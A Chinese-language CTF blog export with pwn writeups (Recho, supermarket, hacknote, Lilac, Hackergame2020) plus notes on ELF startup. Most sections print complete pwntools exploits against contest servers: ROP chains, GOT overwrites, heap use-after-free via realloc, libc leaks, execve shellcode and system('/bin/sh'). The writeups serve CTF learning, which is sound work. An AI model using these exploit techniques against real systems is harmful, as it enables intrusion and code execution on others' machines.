新的一年百题斩的flag，开始拔旗了。不知道自己能不能坚持下去。总之，大致的形式就是这样，我会把大纲放到开头方便进行跳转。 Week_1，两道heap，本地都打不通远程就行。猜测是环境问题。 ","date":"2021-01-10","objectID":"/challenges-100-week-1/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 1","uri":"/challenges-100-week-1/#span-id-jumpchallenges_100-week_1span"},{"categories":["Writeups"],"content":"Recho","date":"2021-01-10","objectID":"/challenges-100-week-1/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 1","uri":"/challenges-100-week-1/#span-id-rechorechospan"},{"categories":["Writeups"],"content":"checksec [*] '/home/giantbranch/Desktop/pwn/recho/recho' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) ","date":"2021-01-10","objectID":"/challenges-100-week-1/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 1","uri":"/challenges-100-week-1/#checksec"},{"categories":["Writeups"],"content":"ida int __cdecl main(int argc, const char **argv, const char **envp) { char nptr[16]; // [rsp+0h] [rbp-40h] BYREF char buf[40]; // [rsp+10h] [rbp-30h] BYREF int v6; // [rsp+38h] [rbp-8h] int v7; // [rsp+3Ch] [rbp-4h] Init(argc, argv, envp); write(1, \"Welcome to Recho server!\\n\", 0x19uLL); while ( read(0, nptr, 0x10uLL) \u003e 0 ) { v7 = atoi(nptr); if ( v7 \u003c= 15 ) v7 = 16; v6 = read(0, buf, v7); buf[v6] = 0; printf(\"%s\", buf); } return 0; } 看起来是一个简单的程序，可以溢出任意字节长度。但是溢出点在while循环中，这样就有一个问题，如何跳出循环？ pwntools有一个shutdown可以用来关闭流，但是在关闭流之后，程序就停止了运行，就像你在终端使用了ctrl+D。一次性要完成所有操作，那么暴露地址的方式肯定不能完成，幸运的是，我们可以使用系统调用(syscall)。对于有些系统,system 也可以用系统调用,而对于有些系统则不行，因此，我们这里不再 geshell，我们直接读取 flag，然后打印出来。 思路：open打开文件，用read读取flag，使用printf打印出来。 open(“flag”,“r”) 通过修改got表的方式调用open， .text:000000000040070D align 2 .text:000000000040070E dw 0C307h 这里有一个这样的指令，将它undefine，然后code，就变成了这样 .text:000000000040070D add [rdi], al .text:000000000040070F retn 很神奇，大师傅只说是经验，具体的原理也不太清楚~~记下来就好。。。 add命令将rdi地址对应的值加上al所保存的值。那么，如果 rdi 里存储着 alarm 的 GOT 表地址， 那么 add [rdi],al 就是把 GOT 表里指向的地址向后偏移 al，由于 alarm 函数向后偏移 0x5 个字 节处调用了 syscall，因此，如果我们的 al 为 0x5，那么，add 指令执行后，我们的 alarm 函 数 GOT 表里的地址就指向了 syscall 的调用处，那么我们调用 alarm 也就是调用 syscall，我 们只需在之前传入 eax（系统调用号），就可以调用我们需要的系统调用。 flag字符串可以在程序种找到，r对应的字符标识符为0 （这个题似乎应该给一下libc的，但是并没有。。） #hack got payload='a'*0x38+p64(pop_rdi)+p64(alarm_got)+p64(pop_rax)+p64(5)+p64(add_rdi) #open flag r payload+=p64(pop_rdi)+p64(flag)+p64(pop_rsi)+p64(0)+p64(0)+p64(pop_rax)+p64(2)+p64(alarm_plt) read(flag, bss, 100) 打开之后将flag读到程序的bss段，调用read函数。打开的第一个文件标识符为3。 #read(3,bss,100) payload+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(bss)+p64(0)+p64(pop_rdx)+p64(100)+p64(read_plt) printf(flag) 不用控制所有的参数，直接传入flag地址就行。 #printf(flag) payload+=p64(pop_rdi)+p64(bss)+p64(printf_plt) ","date":"2021-01-10","objectID":"/challenges-100-week-1/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 1","uri":"/challenges-100-week-1/#ida"},{"categories":["Writeups"],"content":"exp完整exp如下： from pwn import * from LibcSearcher import LibcSearcher context.log_level=\"DEBUG\" context.arch=\"amd64\" local=0 #gdb.attach(p) if local: p=process('./recho') elf = ELF('./recho') else: p=remote('220.249.52.133',43279) elf = ELF('./recho') alarm_got=elf.got['alarm'] alarm_plt=elf.plt['alarm'] read_plt=elf.plt['read'] printf_plt=elf.plt['printf'] pop_rdi=0x4008a3 pop_rsi=0x4008a1 pop_rax=0x4006fc add_rdi=0x40070d pop_rdx=0x4006fe main=0x0400791 flag=0x601058 bss=0x601070 #gdb.attach(p) p.recvuntil('Welcome to Recho server!\\n') p.sendline(str(0x200)) #hack got payload='a'*0x38+p64(pop_rdi)+p64(alarm_got)+p64(pop_rax)+p64(5)+p64(add_rdi) #open flag r payload+=p64(pop_rdi)+p64(flag)+p64(pop_rsi)+p64(0)+p64(0)+p64(pop_rax)+p64(2)+p64(alarm_plt) #read(3,bss,100) payload+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(bss)+p64(0)+p64(pop_rdx)+p64(100)+p64(read_plt) #printf(flag) payload+=p64(pop_rdi)+p64(bss)+p64(printf_plt) payload=payload.ljust(0x200,'\\x00') p.sendline(payload) p.shutdown('send') p.interactive() ","date":"2021-01-10","objectID":"/challenges-100-week-1/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 1","uri":"/challenges-100-week-1/#exp"},{"categories":["Writeups"],"content":"supermarket","date":"2021-01-10","objectID":"/challenges-100-week-1/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 1","uri":"/challenges-100-week-1/#span-id-supermarketsupermarketspan"},{"categories":["Writeups"],"content":"checksec [*] '/home/giantbranch/Desktop/pwn/supermarket/supermarket' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 这个heap竟然没保护全开 ","date":"2021-01-10","objectID":"/challenges-100-week-1/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 1","uri":"/challenges-100-week-1/#checksec-1"},{"categories":["Writeups"],"content":"ida //main void sub_8048FC1() { while ( 1 ) { menu(); printf(\"your choice\u003e\u003e \"); switch ( sub_804882E() ) { case 1: add(); break; case 2: del(); break; case 3: list(); break; case 4: change_price(); break; case 5: change_descrip(); break; case 6: exit(0); return; default: puts(\"invalid choice\"); break; } } } //add int sub_80488DD() { char *v1; // ebx char *v2; // ebx char src[16]; // [esp+4h] [ebp-24h] BYREF int v4; // [esp+14h] [ebp-14h] int v5; // [esp+18h] [ebp-10h] int i; // [esp+1Ch] [ebp-Ch] for ( i = 0; i \u003c= 15 \u0026\u0026 (\u0026s2)[i]; ++i ) ; if ( i \u003e 15 ) return puts(\"no more space\"); printf(\"name:\"); reads((int)src, 16); v5 = sub_8048D45(src); if ( v5 != -1 ) return puts(\"name exist\"); v5 = sub_8048D95(); if ( v5 == -1 ) return puts(\"no more space\"); (\u0026s2)[v5] = (char *)malloc(0x1Cu); strcpy((\u0026s2)[v5], src); printf(\"name:%s\\n\", src); v4 = 0; printf(\"price:\"); v4 = sub_804882E(); printf(\"price:%d\\n\", v4); if ( v4 \u003e 0 \u0026\u0026 v4 \u003c= 999 ) *((_DWORD *)(\u0026s2)[v5] + 4) = v4; *((_DWORD *)(\u0026s2)[v5] + 5) = 0; while ( *((int *)(\u0026s2)[v5] + 5) \u003c= 0 || *((int *)(\u0026s2)[v5] + 5) \u003e 256 ) { printf(\"descrip_size:\"); v1 = (\u0026s2)[v5]; *((_DWORD *)v1 + 5) = sub_804882E(); } printf(\"descrip_size:%d\\n\", *((_DWORD *)(\u0026s2)[v5] + 5)); v2 = (\u0026s2)[v5]; *((_DWORD *)v2 + 6) = malloc(*((_DWORD *)v2 + 5)); printf(\"description:\"); return reads(*((_DWORD *)(\u0026s2)[v5] + 6), *((_DWORD *)(\u0026s2)[v5] + 5)); } int change_descrip() { int v1; // [esp+8h] [ebp-10h] int size; // [esp+Ch] [ebp-Ch] v1 = sub_8048DC8(); if ( v1 == -1 ) return puts(\"not exist\"); for ( size = 0; size \u003c= 0 || size \u003e 256; size = sub_804882E() ) printf(\"descrip_size:\"); if ( *((_DWORD *)(\u0026s2)[v1] + 5) != size ) realloc(*((void **)(\u0026s2)[v1] + 6), size); //漏洞处 printf(\"description:\"); return reads(*((_DWORD *)(\u0026s2)[v1] + 6), *((_DWORD *)(\u0026s2)[v1] + 5)); } 分析整个程序，商品的结构大致为： struct{ char name[16]; int price; int descrip_size; char *descrip; } s2处是一个结构体数组很容易看出来，但是这个结构体就不太容易。我不明白name的字节大小应该是16，伪c代码却显示的+4、+5？所以我去看了汇编代码，这才理清了结构体的结构。 del函数中，将结构体指针指向NULL，所以这里没有可以利用的地方。 利用点在change_descrip中，这里要介绍realloc的实现原理： 1.对ptr进行判断，如果ptr为NULL，则函数相当于malloc(new_size),试着分配一块大小为new_size的内存，如果成功将地址返回，否则返回NULL。如果ptr不为NULL，则进入2 2.查看ptr是不是在堆中，如果不是的话会跑出异常错误，会发生realloc invalid pointer。如果ptr在堆中，则查看new_size大小，如果new_size大小为0，则相当于free(ptr)，讲ptr指针释放，返回NULL，如果new_size小于原大小，则ptr中的数据可能会丢失，只有new_size大小的数据会保存（这里很重要），如果size等于原大小，等于啥都没做，如果size大于原大小，则看ptr所在的位置还有没有足够的连续内存空间，如果有的话，分配更多的空间，返回的地址和ptr相同，如果没有的话，在更大的空间内查找，如果找到size大小的空间，将旧的内容拷贝到新的内存中，把旧的内存释放掉，则返回新地址，否则返回NULL。 就是这个把旧的内存释放，而新内存地址的指针并没有返回取代旧地址。所以我们得到了一个被释放的内存空间。这时再次申请一块内存就又把它拿到了手里。这样我们有了指向同一内存的两个指针。UAF漏洞！ 接下来对漏洞进行利用，在结构体中有一个descrip的指针，修改使其指向atoi的got表，泄露libc地址。然后将其修改为system地址，传入参数“/bin/sh”。 申请第一个node_1，description_size\u003efastbin，第二个node_2，防止chunk与top chunk合并，size随意； 利用realloc，free第一个chunk_1，不要写入东西，否则会破坏chunk结构，导致下面的malloc失败。 申请node_3，由于步骤2中的node_1-\u003edescrip被free，所以在unsorted bin中。chunk被切割为两部分，一部分用来存放结构体，一部分用来存放descrip。 修改node_1的descrip，即改变node_3的结构，使其descrip指向atoi_got。 利用list泄露libc地址。 修改descrip指向system，选项输入‘/bin/sh’。get shell！ ","date":"2021-01-10","objectID":"/challenges-100-week-1/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 1","uri":"/challenges-100-week-1/#ida-1"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher leak = lambda name,addr: log.success('{:#x}'.format(name,addr)) context.log_level=\"DEBUG\" context.arch=\"amd64\" local=0 binary='./supermarket' #gdb.attach(p) if local: p=process(binary) else: p=remote('220.249.52.133',47082) elf = ELF(binary,checksec=False) libc=ELF('./libc.so.6') atoi_got=elf.got[\"atoi\"] def create(name,size,context): p.sendlineafter('your choice\u003e\u003e ','1') p.sendlineafter('name:',str(name)) p.sendlineafter('price:','99') p.sendlineafter('descrip_size:',str(size)) p.sendlineafter('description:',context) def dele(name,size,context): p.sendlineafter('your choice\u003e\u003e ','5') p.sendlineafter('name:',str(name)) p.sendlineafter('descrip_size:',str(size)) p.sendlineafter('description:',context) create(1,0x80,'ppp') create(2,0x20,'aaa') dele(1,0x90,'') create(3,0x20,'bbb') payload='3'.ljust(16,'\\x00')+p32(99)+p32(0x20)+p32(atoi_got) dele(1,0x80,payload) p.sendlineafter('your choice\u003e\u003e ','3') p.recvuntil('3: price.99, des.') atoi_addr=u32(p.recvuntil('\\n').split('\\n')[0].ljust(4,'\\x00')) libcbase=atoi_addr-libc.symbols['atoi'] system=libcbase+libc.symbols['system'] dele(3,0x20,p32(system)) p.sendline('/bin/sh\\x00') p.interactive() ","date":"2021-01-10","objectID":"/challenges-100-week-1/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 1","uri":"/challenges-100-week-1/#exp-1"},{"categories":["Writeups"],"content":"hacknote","date":"2021-01-10","objectID":"/challenges-100-week-1/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 1","uri":"/challenges-100-week-1/#span-idhacknotehacknotespan"},{"categories":["Writeups"],"content":"checksec [*] '/home/giantbranch/Desktop/pwn/hacknote/hacknote' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) ","date":"2021-01-10","objectID":"/challenges-100-week-1/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 1","uri":"/challenges-100-week-1/#checksec-2"},{"categories":["Writeups"],"content":"ida void __cdecl __noreturn main() { int v0; // eax char buf[4]; // [esp+8h] [ebp-10h] BYREF unsigned int v2; // [esp+Ch] [ebp-Ch] v2 = __readgsdword(0x14u); setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 2, 0); while ( 1 ) { while ( 1 ) { menu(); read(0, buf, 4u); v0 = atoi(buf); if ( v0 != 2 ) break; del(); } if ( v0 \u003e 2 ) { if ( v0 == 3 ) { print(); } else { if ( v0 == 4 ) exit(0); LABEL_13: puts(\"Invalid choice\"); } } else { if ( v0 != 1 ) goto LABEL_13; add(); } } } ptr为一个数组，存放指向8字节大小的内存空间。前四字节为puts的函数地址，后四字节为note申请的内存空间地址。 思路就是leak一个libc地址，然后控制那8字节空间，func地址为system，note中为‘/bin/sh’地址。从而get shell。 free后的指针没有被销毁，首先申请两个size\u003e0x8的chunk。然后都free掉，fastbin中就有了四个chunk。其中控制堆块是在同一个bin中的，size都是0x8。这时申请新的size为0x8的note，我们就会获得这两个堆块。这个块的content就是note0的控制堆块。修改后四字节为puts_got,leak出libc的地址。然后free掉这个块，再申请回来，把地址改为system，后面的内容改为‘||sh’ or ‘;sh’。 ","date":"2021-01-10","objectID":"/challenges-100-week-1/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 1","uri":"/challenges-100-week-1/#ida-2"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher leak = lambda name,addr: log.success('{:#x}'.format(name,addr)) context.log_level=\"DEBUG\" #context.arch=\"amd64\" local=0 binary='./hacknote' #gdb.attach(p) if local: p=process(binary) else: p=remote('220.249.52.133',49663) elf = ELF(binary,checksec=False) libc=ELF('libc_32.so.6',checksec=False) def create(size,content): p.sendlineafter(\"Your choice :\",'1') p.sendlineafter(\"Note size :\",str(size)) p.sendlineafter(\"Content :\",str(content)) def dele(index): p.sendlineafter(\"Your choice :\",'2') p.sendlineafter(\"Index :\",str(index)) def show(index): p.sendlineafter(\"Your choice :\",'3') p.sendlineafter(\"Index :\",str(index)) create(0x10,'a'*0x10) create(0x10,'b'*0x10) dele(0) dele(1) create(0x8,p32(0x804862B)+p32(elf.got['puts'])) #gdb.attach(p) p.sendlineafter(\"Your choice :\",'3') p.recvuntil('Index :') p.sendline('0') puts_addr=u32(p.recv(4)) print hex(puts_addr) libcbase=puts_addr-libc.symbols['puts'] system=libcbase+libc.symbols['system'] dele(2) create(0x8,p32(system)+'||sh') show(0) p.interactive() [TOP](# jump) ","date":"2021-01-10","objectID":"/challenges-100-week-1/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 1","uri":"/challenges-100-week-1/#exp-2"},{"categories":["Writeups"],"content":"Lilac HIT本部的ctf战队Lilac的中秋活动，只有三道PWN。 ","date":"2020-11-08","objectID":"/lilac-mid-autum-fun/:0:0","series":null,"tags":["Writeups"],"title":"Lilac Mid Autum Fun","uri":"/lilac-mid-autum-fun/#lilac"},{"categories":["Writeups"],"content":"PWN1","date":"2020-11-08","objectID":"/lilac-mid-autum-fun/:0:0","series":null,"tags":["Writeups"],"title":"Lilac Mid Autum Fun","uri":"/lilac-mid-autum-fun/#pwn1"},{"categories":["Writeups"],"content":"checksec [*] '/home/giantbranch/Desktop/pwn/mid-autum-fun1/pwn' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) ","date":"2020-11-08","objectID":"/lilac-mid-autum-fun/:1:0","series":null,"tags":["Writeups"],"title":"Lilac Mid Autum Fun","uri":"/lilac-mid-autum-fun/#checksec"},{"categories":["Writeups"],"content":"ida向v7中写入v6大小的数据，遇到回车结束。v6就是我们用alloca在栈上申请的大小。 为了保证v6大小能让我们完整的写入payload所以这里给它一个很大的数，“-31”，反正我们不用把所有的申请空间填满。 ","date":"2020-11-08","objectID":"/lilac-mid-autum-fun/:2:0","series":null,"tags":["Writeups"],"title":"Lilac Mid Autum Fun","uri":"/lilac-mid-autum-fun/#ida"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher context.log_level=\"DEBUG\" context.arch=\"amd64\" from ctypes import * libc1=cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6') local=0 offset=0x14-3+8-1 if local: p=process('./pwn') elf = ELF('./pwn') else: p=remote('47.94.239.235',3001) elf = ELF('./pwn') #guess number def guess(): libc1.srand(0X91D) for i in range(66): num=str(libc1.rand()) p.sendlineafter(\"guess next number :\",num) #gdb.attach(p) guess() p.recvuntil(\"size of you name :\") p.sendline('-31') puts_plt=elf.plt['puts'] puts_got=elf.got['puts'] pop_rdi=0x0000000000400b53 main=0x000000000040099C #gdb.attach(p) payload='a'*offset+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main) p.sendline(payload) p.recvline() puts_addr=u64(p.recv(6).ljust(8, '\\x00')) print hex(puts_addr) sleep(0.5) libcbase=puts_addr-0x06f6a0 system=libcbase+0x0453a0 bin_sh=libcbase+0x18ce17 print hex(puts_addr) guess() p.recvuntil(\"size of you name :\") p.sendline('-31') #gdb.attach(p) payload='a'*offset+p64(pop_rdi)+p64(bin_sh)+p64(system) p.sendline(payload) p.interactive() ","date":"2020-11-08","objectID":"/lilac-mid-autum-fun/:3:0","series":null,"tags":["Writeups"],"title":"Lilac Mid Autum Fun","uri":"/lilac-mid-autum-fun/#exp"},{"categories":["Writeups"],"content":"总结题目不难，这里主要介绍两个工具 gdb.attach(p)：这个命令可以让你在执行脚本的时候再为你开启一个终端，供你进行动态调试。这样我们就可以知道自己的脚本在哪一步出了问题。强推 libc database search：LibcSearch虽然感觉很方便，但是它的libc库不算全，这个工具可以让你通过最后三位的偏移确定libc的版本。 ","date":"2020-11-08","objectID":"/lilac-mid-autum-fun/:4:0","series":null,"tags":["Writeups"],"title":"Lilac Mid Autum Fun","uri":"/lilac-mid-autum-fun/#总结"},{"categories":["Writeups"],"content":"玩了一次hackergamer，这里我只给出pwn的解答，也可以去看官方的hackergame2020-writeups ","date":"2020-11-08","objectID":"/hackergame2020/:0:0","series":null,"tags":["Writeups"],"title":"Hackergame2020","uri":"/hackergame2020/#"},{"categories":["Writeups"],"content":"生活在博弈树上两种获得flag的方法： 覆盖胜利判断条件 栈溢出-ROP ","date":"2020-11-08","objectID":"/hackergame2020/:0:0","series":null,"tags":["Writeups"],"title":"Hackergame2020","uri":"/hackergame2020/#生活在博弈树上"},{"categories":["Writeups"],"content":"exp 覆盖胜利条件 from pwn import * from LibcSearcher import LibcSearcher context.log_level=\"DEBUG\" context.arch=\"amd64\" local=0 #gdb.attach(p) if local: p=process('./pwn') elf = ELF('./pwn') else: p=remote('202.38.93.111',10141) elf = ELF('./pwn') offset=0x90-1-5 payload='654:MEQCIEf6j+LhgeLSPOeZC/OwkdH+wHB9nXZHJxMNfAFy8OH5AiAnpcECcSQS8aCnVRKH+poDokge2AodYTIsFcTix+tShA==' p.sendline(payload) payload='(1,1)'+'a'*offset+p64(0x1) p.send(payload) p.interactive() ROP from pwn import * from struct import pack from LibcSearcher import LibcSearcher context.log_level=\"DEBUG\" context.arch=\"amd64\" local=0 #gdb.attach(p) if local: sh=process('./pwn') elf = ELF('./pwn') else: sh=remote('202.38.93.111',10141) elf = ELF('./pwn') offset=0x90-5 payload='654:MEQCIEf6j+LhgeLSPOeZC/OwkdH+wHB9nXZHJxMNfAFy8OH5AiAnpcECcSQS8aCnVRKH+poDokge2AodYTIsFcTix+tShA==' sh.sendline(payload) #gdb.attach(p) # Padding goes here p = '(1,1)'+'a'*offset+p64(0x1) p += pack('\u003cQ', 0x0000000000407228) # pop rsi ; ret p += pack('\u003cQ', 0x00000000004a60e0) # @ .data p += pack('\u003cQ', 0x000000000043e52c) # pop rax ; ret p += '/bin//sh' p += pack('\u003cQ', 0x000000000046d7b1) # mov qword ptr [rsi], rax ; ret p += pack('\u003cQ', 0x0000000000407228) # pop rsi ; ret p += pack('\u003cQ', 0x00000000004a60e8) # @ .data + 8 p += pack('\u003cQ', 0x0000000000439070) # xor rax, rax ; ret p += pack('\u003cQ', 0x000000000046d7b1) # mov qword ptr [rsi], rax ; ret p += pack('\u003cQ', 0x00000000004017b6) # pop rdi ; ret p += pack('\u003cQ', 0x00000000004a60e0) # @ .data p += pack('\u003cQ', 0x0000000000407228) # pop rsi ; ret p += pack('\u003cQ', 0x00000000004a60e8) # @ .data + 8 p += pack('\u003cQ', 0x000000000043dbb5) # pop rdx ; ret p += pack('\u003cQ', 0x00000000004a60e8) # @ .data + 8 p += pack('\u003cQ', 0x0000000000439070) # xor rax, rax ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, 1 ; ret p += pack('\u003cQ', 0x0000000000463af0) # add rax, ","date":"2020-11-08","objectID":"/hackergame2020/:1:0","series":null,"tags":["Writeups"],"title":"Hackergame2020","uri":"/hackergame2020/#exp"},{"categories":["Writeups"],"content":"超精准的宇宙射线真的就是只能改1bit呗 我第一次的思路是只改1bit是不可能获得shell的，有没有办法能重复调用bitflip，于是就在call exit的代码处试了试，结果发现回到了start函数，这样我就能无限修改bit了。 继续分析，在调试的时候发现在0x401000-0x402000段为rwx段，那这个绝对就是我们要写入shellcode的地方了。在call exit的时候会调用0x4010c0的代码，所以我们就在这里写shellcode。 害，python没学好，自己手算了20多个字节，写了几百个比特的翻转。 这里我遇到了问题，我的非常确定的将每个bit正确的翻转了，我在0x401020的位置写入了‘/bin/sh’字符串，在0x401030处写了shellcode，但很奇怪，我动态调试了一下，发现0x401030处的代码没有发生变化，而0x401020处却正确的存入了字符串。 初步猜测是因为我调用的start函数的原因 ","date":"2020-11-08","objectID":"/hackergame2020/:0:0","series":null,"tags":["Writeups"],"title":"Hackergame2020","uri":"/hackergame2020/#超精准的宇宙射线"},{"categories":["Writeups"],"content":"exp #!/usr/bin/env python3 from pwn import * context.log_level='debug' r = remote('202.38.93.111', 10231) r.recvuntil(\"token: \") r.sendline(\"654:MEQCIEf6j+LhgeLSPOeZC/OwkdH+wHB9nXZHJxMNfAFy8OH5AiAnpcECcSQS8aCnVRKH+poDokge2AodYTIsFcTix+tShA==\") def flip(addr, bit): r.recvuntil('flip?') r.sendline(hex(addr) + ' ' + str(bit)) target = 0x401295 flip(target + 1, 6) shellcode_start = 0x4010c0 shellcode = b\"\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05\" e = ELF('./pwn') for i in range(len(shellcode)): b = shellcode[i] ^ e.read(shellcode_start + i, 1)[0] for j in range(8): if (b \u003e\u003e j) \u0026 1: flip(shellcode_start + i, j) flip(target + 1, 6) r.interactive() ","date":"2020-11-08","objectID":"/hackergame2020/:1:0","series":null,"tags":["Writeups"],"title":"Hackergame2020","uri":"/hackergame2020/#exp-1"},{"categories":["Writeups"],"content":"动态链接库检查器这个是真的是没想到，ldd命令是有漏洞的。 (CVE-2019-1010023) - ldd should protect against programs whose segments overlap with the loader itself 请注意，在某些情况下（例如，程序指定了ld-linux.so以外的ELF解释器），某些版本的ldd可能会尝试通过直接执行程序来尝试获取依赖项信息，从而可能导致执行程序的ELF解释器中定义的任何代码，还可能导致执行程序本身。 （例如，在2.27之前的glibc版本中，上游ldd实现做到了这一点，尽管大多数发行版提供的修改版本都没有。）因此，切勿在不受信任的可执行文件上使用ldd，因为这可能会导致执行任意代码。处理不受信任的可执行文件时，更安全的选择是：$ objdump -p / path / to / program | grep需要，但是，这种选择只显示了可执行文件的直接依赖关系，而ldd显示了可执行文件的整个依赖关系树。 ","date":"2020-11-08","objectID":"/hackergame2020/:0:0","series":null,"tags":["Writeups"],"title":"Hackergame2020","uri":"/hackergame2020/#动态链接库检查器"},{"categories":["Pwning"],"content":"程序开始一个程序真正的入口是_start函数。 start函数有三个参数： agrc——表示有多少个命令行参数，第一个就是执行程序名，所以argc最少为1。 argv是具体的参数。字符串数组 argv[0]为空串(\"\") 。 argv[1] 为在DOS命令行中执行程序名后的第一个字符串; argv[2] 为执行程序名后的第二个字符串; …… argv[argc]为NULL。 envp是系统的环境变量，字符串数组，envp[]的每一个元素都包含在ENVVAR=value形式的字符串。 我们使用一个简单的程序simple.c看一下这个过程： int main() { return 0; } 编译后使用 objdump -f simple giantbranch@ubuntu:~/Desktop$ objdump -f simple simple: file format elf64-x86-64 architecture: i386:x86-64, flags 0x00000112: EXEC_P, HAS_SYMS, D_PAGED start address 0x00000000004003e0 这里显示的开始地址就是_start函数的地址，我们进行反编译看一看： objdump -d simple Disassembly of section .text: 00000000004003e0 \u003c_start\u003e: 4003e0: 31 ed xor %ebp,%ebp 4003e2: 49 89 d1 mov %rdx,%r9 4003e5: 5e pop %rsi 4003e6: 48 89 e2 mov %rsp,%rdx 4003e9: 48 83 e4 f0 and $0xfffffffffffffff0,%rsp 4003ed: 50 push %rax 4003ee: 54 push %rsp 4003ef: 49 c7 c0 60 05 40 00 mov $0x400560,%r8 4003f6: 48 c7 c1 f0 04 40 00 mov $0x4004f0,%rcx 4003fd: 48 c7 c7 d6 04 40 00 mov $0x4004d6,%rdi 400404: e8 b7 ff ff ff callq 4003c0 \u003c__libc_start_main@plt\u003e 400409: f4 hlt 40040a: 66 0f 1f 44 00 00 nopw 0x0(%rax,%rax,1) 可以看到_start函数向寄存器中传递了参数： 0x400560：__libc_csu_fini的地址 0x4004f0：__libc_csu_init的地址 0x4004d6：main的地址 然后调用了一个libc函数__libc_start_main： extern int BP_SYM (__libc_start_main) (int (*main) (int, char **, char **), int argc, char *__unbounded *__unbounded ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void *__unbounded stack_end) __attribute__ ((noreturn)); __libc_start_main函数做了什么呢？ 处理关于setuid、setgid程序的安全问题 启动线程 把fini函数和rtld_fini函数作为参数传递给at_exit调用，使它们在at_exit里被调用，从而完成用户程序和加载器的调用结束之后的清理工作 调用其init参数 调用main函数，并把argc和argv参数、环境变量传递给它 调用exit函数，并将main函数的返回值传递给它 init参数就是__libc_csu_init函数： .text:00000000004005C0 ; void _libc_csu_init(void) .text:00000000004005C0 public __libc_csu_init .text:00000000004005C0 __libc_csu_init proc near ; DATA XREF: _start+16\u0018o .text:00000000004005C0 push r15 .text:00000000004005C2 push r14 .text:00000000004005C4 mov r15d, edi .text:00000000004005C7 push r13 .text:00000000004005C9 push r12 .text:00000000004005CB lea r12, __frame_dummy_init_array_entry .text:00000000004005D2 push rbp .text:00000000004005D3 lea rbp, __do_global_dtors_aux_fini_array_entry .text:00000000004005DA push rbx .text:00000000004005DB mov r14, rsi 